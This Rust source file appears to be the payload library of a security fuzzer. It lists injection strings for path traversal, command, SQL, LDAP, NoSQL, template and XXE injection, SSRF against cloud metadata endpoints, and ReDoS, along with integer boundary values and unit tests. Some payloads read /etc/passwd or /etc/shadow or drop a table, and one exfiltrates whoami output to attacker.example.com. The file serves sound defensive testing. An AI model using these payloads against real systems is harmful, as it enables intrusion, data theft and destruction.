pub struct PayloadCategory {
    pub name: &'static str,
    pub payloads: &'static [&'static str],
}

pub static PATH_TRAVERSAL: PayloadCategory = PayloadCategory {
    name: "path_traversal",
    payloads: &[
        "../../../etc/passwd",
        "../../etc/passwd",
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..\\..\\..\\windows\\system32\\cmd.exe",
        "/etc/passwd",
        "C:\\Windows\\System32\\cmd.exe",
    ],
};

pub static COMMAND_INJECTION: PayloadCategory = PayloadCategory {
    name: "command_injection",
    payloads: &[
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(whoami)",
        "$(cat /etc/passwd)",
        "\nls -la",
        "; curl http://attacker.example.com/$(whoami)",
    ],
};

pub static SQL_INJECTION: PayloadCategory = PayloadCategory {
    name: "sql_injection",
    payloads: &[
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1 UNION SELECT null,null,null--",
        "1' AND SLEEP(5)--",
        "\" OR \"1\"=\"1",
        "\\x27 OR 1=1",
    ],
};

pub static LDAP_INJECTION: PayloadCategory = PayloadCategory {
    name: "ldap_injection",
    payloads: &[
        "*)(uid=*))(|(uid=*",
        "*()|%26'",
        "admin)(&)",
        "*)(|(password=*))",
    ],
};

pub static NOSQL_INJECTION: PayloadCategory = PayloadCategory {
    name: "nosql_injection",
    payloads: &[
        "{\"$gt\": \"\"}",
        "{\"$where\": \"1==1\"}",
        "{\"$ne\": null}",
        "';return 'a'=='a' && ''=='",
    ],
};

pub static FORMAT_STRING: PayloadCategory = PayloadCategory {
    name: "format_string",
    payloads: &["%s%s%s%s%n", "%x%x%x%x", "{0}", "{{}}"],
};

pub static TEMPLATE_INJECTION: PayloadCategory = PayloadCategory {
    name: "template_injection",
    payloads: &["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}"],
};

pub static XML_INJECTION: PayloadCategory = PayloadCategory {
    name: "xml_injection",
    payloads: &[
        "]]><![CDATA[<script>alert(1)</script>]]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        "<foo>&xxe;</foo>",
    ],
};

/// SSRF payloads: internal IPs, cloud metadata endpoints, and protocol-scheme abuse.
/// Targets string fields that may be passed to URL-fetching or network-connecting code.
/// Basis: PortSwigger SSRF cheatsheet; HackTricks SSRF; cloud metadata endpoint list.
pub static SSRF: PayloadCategory = PayloadCategory {
    name: "ssrf",
    payloads: &[
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "file:///etc/passwd",
        "file://localhost/etc/shadow",
        "gopher://127.0.0.1:6379/_PING",
        "dict://127.0.0.1:6379/info",
    ],
};

/// ReDoS payloads: strings that trigger catastrophic backtracking in vulnerable regex engines.
/// Targets string fields processed by server-side regex validation.
/// Basis: OWASP ReDoS; Snyk ReDoS vulnerability catalog; Davis et al. (2018).
pub static REDOS: PayloadCategory = PayloadCategory {
    name: "redos",
    payloads: &[
        // Long repetition that exhausts backtracking regex engines
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        // Email-like pattern targeting common `(a+)+@` regex vulnerabilities
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@b",
        // Mismatched nested quantifier input
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@aaaaaaaaa",
        // Ambiguous alternation: triggers (a|a)* backtracking
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax",
    ],
};

/// All string payload categories. Used by the argument fuzzer for string fields.
pub static ALL_CATEGORIES: &[&PayloadCategory] = &[
    &PATH_TRAVERSAL,
    &COMMAND_INJECTION,
    &SQL_INJECTION,
    &LDAP_INJECTION,
    &NOSQL_INJECTION,
    &FORMAT_STRING,
    &TEMPLATE_INJECTION,
    &XML_INJECTION,
    &SSRF,
    &REDOS,
];

/// Integer boundary values that commonly trigger off-by-one errors, overflow, or type confusion.
pub static INTEGER_BOUNDARIES: &[i64] = &[
    0,
    1,
    -1,
    127,
    128,
    -128,
    -129,
    255,
    256,
    -256,
    32767,
    32768,
    -32768,
    -32769,
    65535,
    65536,
    2_147_483_647,              // i32::MAX
    -2_147_483_648,             // i32::MIN
    2_147_483_648,              // i32::MAX + 1
    4_294_967_295,              // u32::MAX
    9_223_372_036_854_775_807,  // i64::MAX
    -9_223_372_036_854_775_808, // i64::MIN
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn all_categories_non_empty() {
        for cat in ALL_CATEGORIES {
            assert!(
                !cat.payloads.is_empty(),
                "category '{}' has no payloads",
                cat.name
            );
        }
    }

    #[test]
    fn integer_boundaries_include_extremes() {
        assert!(INTEGER_BOUNDARIES.contains(&0));
        assert!(INTEGER_BOUNDARIES.contains(&i64::MAX));
        assert!(INTEGER_BOUNDARIES.contains(&i64::MIN));
        assert!(INTEGER_BOUNDARIES.contains(&(i32::MAX as i64)));
        assert!(INTEGER_BOUNDARIES.contains(&(i32::MIN as i64)));
    }

    #[test]
    fn path_traversal_includes_canonical_form() {
        assert!(PATH_TRAVERSAL.payloads.contains(&"../../../etc/passwd"));
    }

    #[test]
    fn command_injection_includes_subshell() {
        assert!(COMMAND_INJECTION.payloads.iter().any(|p| p.contains("$(")));
    }
}
